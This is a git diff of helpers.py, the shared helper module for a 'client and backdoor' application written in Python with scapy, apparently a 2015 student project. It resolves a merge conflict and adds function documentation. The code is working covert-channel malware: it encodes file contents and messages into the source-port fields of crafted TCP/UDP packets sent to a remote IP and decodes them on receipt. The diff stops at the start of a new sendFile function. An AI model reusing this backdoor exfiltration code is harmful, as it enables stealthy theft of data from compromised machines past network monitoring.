@@ -1,8 +1,26 @@
-<<<<<<< HEAD
+#!/usr/bin/python
+
+#-----------------------------------------------------------------------------
+#-- SOURCE FILE:    helpers.py -   helper methods for client and backdoor
+#--
+#-- FUNCTIONS:      chunkString(size, string)
+#--                 createPacketTwo(protocol, ip, char1, char2, port)
+#--                 createPacketOne(protocol, ip, char, port)
+#--                 parsePacket(packet)
+#--                 sendMessage(message, password, protocol, ip, port)
+#--                 readOneByte(fileDescriptor)
+#--                 sendFile(ip, filePath, protocol, port, password)
+#--
+#-- DATE:           November 29, 2015
+#--
+#-- PROGRAMMERS:    Brij Shah & Callum Styan
+#--
+#-- NOTES:
+#-- Includes all file and packet handling methods for the client and backdoor
+#-- application.
+#-----------------------------------------------------------------------------
+
 import binascii, time, os, ntpath, encryption, configfile, logging
-=======
-import binascii, time, os, logging
->>>>>>> 30b3bebd64668234701cf28ae5b4c77fca846edd
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
@@ -10,11 +28,36 @@ maxPort = 65535
 # lastPosition = 0
 # fileSize = 0
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       chunkString(size, string)
+#--
+#-- VARIABLES(S):   size - size to chunk string into
+#--                 string - string passed into to chunk into certain sizes
+#--
+#-- NOTES:
+#-- Takes a string and splits it into chunks of specified size
+#-----------------------------------------------------------------------------
 # take string and break it into chunks of length size
 def chunkString(size, string):
   chunkedString = [string[i:i+size] for i in range(0, len(string), size)]
   return chunkedString
 
+
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       createPacketTwo(protocol, ip, char1, char2, port)
+#--
+#-- VARIABLES(S):   protocol - protocol to use when crafting packet
+#--                 ip - ip to send packet too
+#--                 char1 - first character to place in source port
+#--                 char2 - second character to place in source port
+#--                 port - port to use as destination port
+#--
+#-- NOTES:
+#-- Takes in two ascii characters and converts both into binary strings, 
+#-- concatenates the strings and turns the result into an integer value. It then
+#-- creates a packet with specified parameters from configuration file such as
+#-- protocol and port. Returns a packet created by scapy.
+#-----------------------------------------------------------------------------
 def createPacketTwo(protocol, ip, char1, char2, port):
     # get the binary values of both chars without the binary string indicator
     binChar1 = bin(ord(char1))[2:].zfill(8)
@@ -30,10 +73,20 @@ def createPacketTwo(protocol, ip, char1, char2, port):
         packet = IP(dst=ip)/UDP(dport=port, sport=maxPort - intPortVal)
     return packet
 
-# create a packet when we only have 1 character remaining in the file
-# works exactly the same as createPacketTwo except we only have one character
-# returns a TCP packet created by scapy.
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       createPacketOne(protocol, ip, char, port)
+#--
+#-- VARIABLES(S):   protocol - either TCP or UDP
+#--                 ip - IP to send packet too
+#--                 char - character to place into source port
+#--                 port - port to use as destination port
+#--
+#-- NOTES:
+#-- create a packet when we only have 1 character remaining in the file
+#-- works exactly the same as createPacketTwo except we only have one character
+#-- returns a packet created by scapy.
+#-----------------------------------------------------------------------------
 def createPacketOne(protocol, ip, char, port):
     # get the binary value of the character
     binChar = bin(ord(char))[2:].zfill(8)
@@ -47,7 +100,21 @@ def createPacketOne(protocol, ip, char, port):
         packet = IP(dst=ip)/UDP(dport=port, sport=maxPort - intPortVal)
     return packet
 
-# need comment
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       parsePacket(packet)
+#--
+#-- VARIABLES(S):   packet - the packet passed in from sniff
+#--
+#-- NOTES:
+#-- takes in a packet that passes our sniff filter
+#-- Gets the difference between 65535 and the source port field in the packet,
+#-- then gets the binary value of that difference.  If the length of the binary
+#-- string is greater than 8, then we parse 2 characters from the string, otherwise
+#-- the string only contains one character.  We convert the binary string to an
+#-- ASCII character.  You'll notice that we open and close the output file within
+#-- this function, that's because pythons file library requires the file to be closed
+#-- for the data from our write calls to actually be written to the file.
+#-----------------------------------------------------------------------------
 def parsePacket(packet):
     sport = packet.sport
     difference = maxPort - sport
@@ -69,7 +136,18 @@ def parsePacket(packet):
         #print "Received: " + char
         return str(char)
 
-# we should pass the encrypted password + string (command results or something else)
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       sendMessage(message, password, protocol, ip, port)
+#--
+#-- VARIABLES(S):   message -
+#--                 password - 
+#--                 protocol - 
+#--                 ip - 
+#--                 port - 
+#--
+#-- NOTES:
+#-- 
+#-----------------------------------------------------------------------------
 def sendMessage(message, password, protocol, ip, port):
   lastIndex = len(message) - 1
   for index, char in enumerate(message):
@@ -79,30 +157,20 @@ def sendMessage(message, password, protocol, ip, port):
     send(packet, verbose=0)
     time.sleep(0.1) # we should check if this is actually necessary
 
+#-----------------------------------------------------------------------------
+#-- FUNCTION:       readOneByte(fileDescriptor)
+#--
+#-- VARIABLES(S):   fileDescriptor 
+#--
+#-- NOTES:
+#-- 
+#-----------------------------------------------------------------------------
 def readOneByte(fileDescriptor):
     global lastPosition
     fileDescriptor.seek(lastPosition)
     byte = fileDescriptor.read(1)
     lastPosition = fileDescriptor.tell()
     return byte
-
-# def sendFile(ip, filePath, protocol, port, password):
-#     global lastPosition
-#     global fileSize
-#     fileSize = os.path.getsize(filePath)
-#     fileDescriptor = open(filePath, 'rb')
-#     while lastPosition < fileSize:
-#         if lastPosition == fileSize -1:
-#             char = readOneByte(fileDescriptor)
-#             packet = createPacketOne(protocol, ip, char, port)
-#         else:
-#             char1 = readOneByte(fileDescriptor)
-#             char2 = readOneByte(fileDescriptor)
-#             packet = createPacketTwo(protocol, ip, char1, char2, port)
-#         if lastPosition == fileSize:
-#             packet = packet/Raw(load=password)
-#         send(packet, verbose = 0)
-#         time.sleep(0.5)
 
 def sendFile(ip, filePath, protocol, port, password):
     fileDescriptor = open(filePath, 'rb')
